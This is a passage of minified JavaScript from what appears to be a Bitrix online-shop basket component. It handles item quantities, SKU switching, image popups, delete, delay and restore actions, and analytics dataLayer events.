e=BX(this.ids.item+t),i=BX(this.ids.itemServices+t);if(this.items[t]&&BX.type.isDomNode(e)){var s=this.getTemplate("basket-item-template");if(s){var a,n=BX(this.ids.itemHeightAligner+t);BX.type.isDomNode(n)&&(a=n.clientHeight);var r=this.renderBasketItem(s,this.items[t]);e.insertAdjacentHTML("beforebegin",r),BX.remove(e),BX.remove(i),a&&(n=BX(this.ids.itemHeightAligner+t),BX.type.isDomNode(n)&&n.clientHeight<a&&(n.style.minHeight=a+"px",setTimeout((function(){n.style.minHeight="0px"}),1))),this.bindBasketItemEvents(this.items[t]),this.filter.isActive()&&this.filter.highlightSearchMatch(this.items[t])}}},restoreBasketItems:function(t){var e,i,s,a;if(t&&0!==Object.keys(t).length)for(e in t)t.hasOwnProperty(e)&&(i=t[e],this.isItemShown(e)&&(this.changeShownItem(e,i,!0),s=BX(this.ids.item+e),a=BX(this.ids.itemServices+e),BX.type.isDomNode(s)&&(s.id=this.ids.item+i,s.setAttribute("data-id",i)),BX.type.isDomNode(a)&&(a.id=this.ids.itemServices+i,a.setAttribute("data-id",i))),this.changeSortedItem(e,!1,!0))},bindBasketItemEvents:function(t){if(t){var e=BX(this.ids.item+t.ID);BX.type.isDomNode(e)&&(this.bindQuantityEvents(e,t),this.bindSkuEvents(e,t),this.bindImageEvents(e,t),this.bindActionEvents(e,t),this.bindRestoreAction(e,t),this.bindItemWarningEvents(e,t))}},bindQuantityEvents:function(t,e){if(t&&e&&this.isItemAvailable(e.ID)){var i,s=this.getEntity(t,"basket-item-quantity-block");if(s){var a=this.isTouch?"touchstart":"mousedown",n=this.isTouch?"touchend":"mouseup";i=this.getEntity(s,"basket-item-quantity-minus"),BX.bind(i,a,BX.proxy(this.startQuantityInterval,this)),BX.bind(i,n,BX.proxy(this.clearQuantityInterval,this)),BX.bind(i,"mouseout",BX.proxy(this.clearQuantityInterval,this)),BX.bind(i,"click",BX.proxy(this.quantityMinus,this)),i=this.getEntity(s,"basket-item-quantity-plus"),BX.bind(i,a,BX.proxy(this.startQuantityInterval,this)),BX.bind(i,n,BX.proxy(this.clearQuantityInterval,this)),BX.bind(i,"mouseout",BX.proxy(this.clearQuantityInterval,this)),BX.bind(i,"click",BX.proxy(this.quantityPlus,this)),i=this.getEntity(s,"basket-item-quantity-field"),BX.bind(i,"change",BX.proxy(this.quantityChange,this))}}},startQuantityInterval:function(){var t=BX.proxy_context,e="basket-item-quantity-minus"===t.getAttribute("data-entity")?BX.proxy(this.quantityMinus,this):BX.proxy(this.quantityPlus,this);this.quantityDelay=setTimeout(BX.delegate((function(){this.quantityTimer=setInterval((function(){e(t)}),150)}),this),300)},clearQuantityInterval:function(){clearTimeout(this.quantityDelay),clearInterval(this.quantityTimer)},quantityPlus:function(t){BX.type.isDomNode(t)||(t=BX.proxy_context,this.clearQuantityInterval());var e=this.getItemDataByTarget(t);if(e){var i=BX(this.ids.quantity+e.ID),s=this.isQuantityFloat(e),a=s?parseFloat(i.value):Math.round(i.value),n=s?parseFloat(e.MEASURE_RATIO):parseInt(e.MEASURE_RATIO),r=parseFloat((a+n).toFixed(5));r=this.getCorrectQuantity(e,r),this.setQuantity(e,r)}},quantityMinus:function(t){t=BX.type.isDomNode(t)?t:BX.proxy_context;var e=this.getItemDataByTarget(t);if(e){var i=BX(this.ids.quantity+e.ID),s=this.isQuantityFloat(e),a=s?parseFloat(i.value):Math.round(i.value),n=s?parseFloat(e.MEASURE_RATIO):parseInt(e.MEASURE_RATIO),r=parseFloat((a-n).toFixed(5));r=this.getCorrectQuantity(e,r),this.setQuantity(e,r)}},quantityChange:function(){var t,e,i=this.getItemDataByTarget(BX.proxy_context);i&&(t=BX(this.ids.quantity+i.ID),e=this.getCorrectQuantity(i,t.value),this.setQuantity(i,e))},isQuantityFloat:function(t){return"Y"===this.params.QUANTITY_FLOAT||parseInt(t.MEASURE_RATIO)!==parseFloat(t.MEASURE_RATIO)},getCorrectQuantity:function(t,e){var i=this.isQuantityFloat(t),s=i?parseFloat(t.MEASURE_RATIO):parseInt(t.MEASURE_RATIO),a=0;(e=(i?parseFloat(e):parseInt(e,10))||0)<0&&(e=0),s>0&&e<s&&(e=s),"Y"===t.CHECK_MAX_QUANTITY&&(a=i?parseFloat(t.AVAILABLE_QUANTITY):parseInt(t.AVAILABLE_QUANTITY))>0&&e>a&&(e=a);var n,r=(e/s-(e/s).toFixed(0)).toFixed(5);return 0===parseFloat(r)?e:(0!==s&&1!==s&&(n=e*this.precisionFactor%(s*this.precisionFactor)/this.precisionFactor,s>0&&n>0&&(n>=s/2&&(0===a||e+s-n<=a)?e+=s-n:e-=n)),e=i?parseFloat(e):parseInt(e,10))},setQuantity:function(t,e){var i,s=BX(this.ids.quantity+t.ID);s&&(e=parseFloat(e),i=parseFloat(s.getAttribute("data-value")),s.value=e,parseFloat(t.QUANTITY)!==parseFloat(e)&&(this.animatePriceByQuantity(t,e),this.actionPool.changeQuantity(t.ID,e,i)))},animatePriceByQuantity:function(t,e){var i=BX(this.ids.sumPrice+t.ID);if(BX.type.isDomNode(i)){var s=e/parseFloat(t.MEASURE_RATIO),a=parseFloat(t.SUM_PRICE),n=parseFloat(t.PRICE)*s,r=parseInt(a)===parseFloat(a)&&parseInt(n)===parseFloat(n);a!==n&&(this.items[t.ID].QUANTITY=e,this.items[t.ID].SUM_PRICE=n,new BX.easing({duration:"Y"===this.params.USE_PRICE_ANIMATION?this.duration.priceAnimation:1,start:{price:a},finish:{price:n},transition:BX.easing.makeEaseOut(BX.easing.transitions.quad),step:BX.delegate((function(e){r||(e.price=(e.price+e.price%1e3/1e3).toFixed(5)),i.innerHTML=this.getFormatPrice(e.price,t.CURRENCY)}),this),complete:BX.delegate((function(){var e,a;i.innerHTML=this.getFormatPrice(n,t.CURRENCY),e=BX(this.ids.sumPriceOld+t.ID),BX.type.isDomNode(e)&&(a=parseFloat(t.FULL_PRICE)*s,e.innerHTML=this.getFormatPrice(a,t.CURRENCY)),e=BX(this.ids.sumPriceDiff+t.ID),BX.type.isDomNode(e)&&(a=parseFloat(t.DISCOUNT_PRICE)*s,e.innerHTML=this.getFormatPrice(a,t.CURRENCY))}),this)}).animate())}},getItemDataByTarget:function(t){var e,i=!1,s=BX.findParent(t,{attrs:{"data-entity":"basket-item"}});return s&&(e=s.getAttribute("data-id"),i=this.items[e]),i},bindSkuEvents:function(t,e){if(t&&e){var i,s,a,n,r,o=this.getEntities(t,"basket-item-sku-block");for(s=0,a=o.length;s<a;s++)for(n=0,r=(i=this.getEntities(o[s],"basket-item-sku-field")).length;n<r;n++)BX.bind(i[n],"click",BX.proxy(this.changeSku,this))}},changeSku:function(){var t,e,i=BX.proxy_context;if(!BX.hasClass(i,"selected")){var s=this.getItemDataByTarget(i);if(s){var a=BX(this.ids.item+s.ID);if(a){var n=this.getEntities(i.parentNode,"basket-item-sku-field");for(t=0,e=n.length;t<e;t++)n[t].isEqualNode(i)?BX.addClass(n[t],"selected"):BX.removeClass(n[t],"selected");this.actionPool.changeSku(s.ID,this.getSkuPropertyValues(a),this.getInitialSkuPropertyValues(a))}this.deleteServices(s)}}},getSkuPropertyValues:function(t){for(var e={},i=this.getEntities(t,"basket-item-sku-field",".selected"),s=0,a=i.length;s<a;s++)e[i[s].getAttribute("data-property")]=BX.util.htmlspecialcharsback(i[s].getAttribute("data-value-id"));return e},getInitialSkuPropertyValues:function(t){for(var e={},i=this.getEntities(t,"basket-item-sku-field",'[data-initial="true"]'),s=0,a=i.length;s<a;s++)e[i[s].getAttribute("data-property")]=BX.util.htmlspecialcharsback(i[s].getAttribute("data-value-id"));return e},bindImageEvents:function(t,e){if(t&&e)for(var i=t.querySelectorAll(".basket-item-custom-block-photo-item"),s=0,a=i.length;s<a;s++)BX.bind(i[s],"click",BX.proxy(this.showPropertyImagePopup,this))},showPropertyImagePopup:function(){var t,e,i,s,a,n;if(t=BX.proxy_context,s=this.getItemDataByTarget(t),e=t.getAttribute("data-column-property-code"),i=t.getAttribute("data-image-index"),s&&s.COLUMN_LIST)for(n in s.COLUMN_LIST)if(s.COLUMN_LIST.hasOwnProperty(n)&&s.COLUMN_LIST[n].CODE===e&&s.COLUMN_LIST[n].VALUE[i]){a=s.COLUMN_LIST[n].VALUE[i].IMAGE_SRC_ORIGINAL;break}if(a){this.imagePopup&&this.imagePopup.destroy();var r="bx-soa-image-popup-content",o=this;this.imagePopup=new BX.PopupWindow("bx-soa-image-popup",null,{lightShadow:!0,offsetTop:0,offsetLeft:0,closeIcon:{top:"3px",right:"10px"},autoHide:!0,bindOptions:{position:"bottom"},closeByEsc:!0,zIndex:100,events:{onPopupShow:function(){BX.create("IMG",{props:{src:a},events:{load:function(){var t=BX(r);if(t){var e,i,s=BX.GetWindowInnerSize(),a=o.isMobile?.5:.9;BX.cleanNode(t),t.appendChild(this),e=t.offsetHeight,i=t.offsetWidth,e>s.innerHeight*a&&(t.style.height=s.innerHeight*a+"px",t.style.width=i*(s.innerHeight*a/e)+"px",e=t.offsetHeight,i=t.offsetWidth),i>s.innerWidth*a&&(t.style.width=s.innerWidth*a+"px",t.style.height=e*(s.innerWidth*a/i)+"px"),t.style.height=t.offsetHeight+"px",t.style.width=t.offsetWidth+"px",o.imagePopup.adjustPosition()}}}})},onPopupClose:function(){this.destroy()}},content:BX.create("DIV",{props:{id:r}})}),this.imagePopup.show()}},bindActionEvents:function(t,e){if(t&&e){var i;if(BX.util.in_array("DELETE",this.params.COLUMNS_LIST))for(var s=0,a=(i=this.getEntities(t,"basket-item-delete")).length;s<a;s++)BX.bind(i[s],"click",BX.proxy(this.deleteAction,this)),BX.bind(i[s],"click",BX.proxy(this.deleteServicesAction,this));BX.util.in_array("DELAY",this.params.COLUMNS_LIST)&&(i=this.getEntity(t,"basket-item-add-delayed"),BX.bind(i,"click",BX.proxy(this.addDelayedAction,this))),i=this.getEntity(t,"basket-item-remove-delayed"),BX.bind(i,"click",BX.proxy(this.removeDelayedAction,this)),i=this.getEntity(t,"basket-item-merge-sku-link"),BX.bind(i,"click",BX.proxy(this.mergeAction,this)),i=this.getEntity(t,"basket-item-show-similar-link"),BX.bind(i,"click",BX.delegate((function(){this.toggleFilter("similar")}),this))}},deleteAction:function(){var t=this.getItemDataByTarget(BX.proxy_context);t&&(this.actionPool.deleteItem(t.ID),this.items[t.ID].SHOW_LOADING=!0,"Y"===this.params.SHOW_RESTORE&&this.isItemAvailable(t.ID)&&(this.items[t.ID].SHOW_RESTORE=!0),this.redrawBasketItemNode(t.ID))},deleteServicesAction:function(){var t=this.getItemDataByTarget(BX.proxy_context);t&&this.deleteServices(t)},deleteServices:function(t){t&&$.ajax({url:arAsproOptions.SITE_DIR+"ajax/item.php?delete_linked_services="+t.PRODUCT_ID,type:"post",success:function(t){updateBasketInfoServices(!1),getActualBasket()}})},addDelayedAction:function(){var t=this.getItemDataByTarget(BX.proxy_context);t&&(this.actionPool.addDelayed(t.ID),this.items[t.ID].SHOW_LOADING=!0,this.redrawBasketItemNode(t.ID))},removeDelayedAction:function(){var t=this.getItemDataByTarget(BX.proxy_context);t&&(this.actionPool.removeDelayed(t.ID),this.items[t.ID].SHOW_LOADING=!0,this.redrawBasketItemNode(t.ID))},mergeAction:function(){var t=this.getItemDataByTarget(BX.proxy_context);t&&this.actionPool.mergeSku(t.ID)},bindRestoreAction:function(t,e){t&&e&&"Y"===this.params.SHOW_RESTORE&&(BX.bind(this.getEntity(t,"basket-item-restore-button"),"click",BX.delegate((function(){this.actionPool.restoreItem(e.ID,{PRODUCT_ID:e.PRODUCT_ID,QUANTITY:e.QUANTITY,PROPS:e.PROPS_ALL,SORT:e.SORT,MODULE:e.MODULE,PRODUCT_PROVIDER_CLASS:e.PRODUCT_PROVIDER_CLASS}),this.items[e.ID].SHOW_RESTORE=!1,this.items[e.ID].SHOW_LOADING=!0,this.redrawBasketItemNode(e.ID)}),this)),BX.bind(this.getEntity(t,"basket-item-close-restore-button"),"click",BX.delegate((function(){this.deleteBasketItem(e.ID,!1,!0)}),this)))},bindItemWarningEvents:function(t,e){t&&e&&BX.bind(this.getEntity(BX(this.ids.item+e.ID),"basket-item-warning-close"),"click",BX.proxy(this.closeItemWarnings,this))},closeItemWarnings:function(){var t=BX.proxy_context;if(BX.type.isDomNode(t)){var e=this.getItemDataByTarget(t);this.items[e.ID].WARNINGS=[],this.warningItems.splice(BX.util.array_search(e.ID,this.warningItems),1),this.redrawBasketItemNode(e.ID),this.editWarnings()}},renderBasketItem:function(t,e){var i=BX.clone(e);return BX.type.isPlainObject(i)&&(i.USE_FILTER=this.useItemsFilter&&!this.filter.currentFilter.similarHash.length),Mustache.render(t,i)},render:function(t,e){return Mustache.render(t,e)},checkAnalytics:function(t){if(t&&t.basket){var e,i={};for(var s in t.basket)t.basket.hasOwnProperty(s)&&(s.indexOf("QUANTITY_")>=0?(e=s.substr(9),this.items[e]&&(i[e]=parseFloat(t.basket[s])-parseFloat(BX(this.ids.quantity+e).getAttribute("data-value")))):s.indexOf("DELETE_")>=0?(e=s.substr(7),this.items[e]&&(i[e]=-parseFloat(this.items[e].QUANTITY))):s.indexOf("RESTORE_")>=0&&(e=s.substr(8),this.items[e]&&(i[e]=parseFloat(this.items[e].QUANTITY))));this.setAnalyticsDataLayer(i)}},setAnalyticsDataLayer:function(t){if(t&&0!==Object.keys(t).length){window[this.params.DATA_LAYER_NAME]=window[this.params.DATA_LAYER_NAME]||[];var e=[],i=[];for(var s in t)t.hasOwnProperty(s)&&(t[s]>0?e.push(this.getItemAnalyticsInfo(s,t[s])):t[s]<0&&i.push(this.getItemAnalyticsInfo(s,t[s])));e.length&&window[this.params.DATA_LAYER_NAME].push({event:"addToCart",ecommerce:{currencyCode:this.items[s].CURRENCY||"",add:{products:e}}}),i.length&&window[this.params.DATA_LAYER_NAME].push({event:"removeFromCart",ecommerce:{currencyCode:this.items[s].CURRENCY||"",remove:{products:i}}})}},getItemAnalyticsInfo:function(t,e){if(!this.items[t])return{};for(var i=(this.items[t].BRAND||"").split(",  ").join("/"),s=[],a=this.getEntities(BX(this.ids.item+t),"basket-item-sku-field",".selected"),n=0,r=a.length;n<r;n++)s.push(a[n].getAttribute("data-sku-name"));return{name:this.items[t].NAME||"",id:this.items[t].PRODUCT_ID||"",price:this.items[t].PRICE||0,brand:i,variant:s.join("/"),quantity:Math.abs(e)}}}}();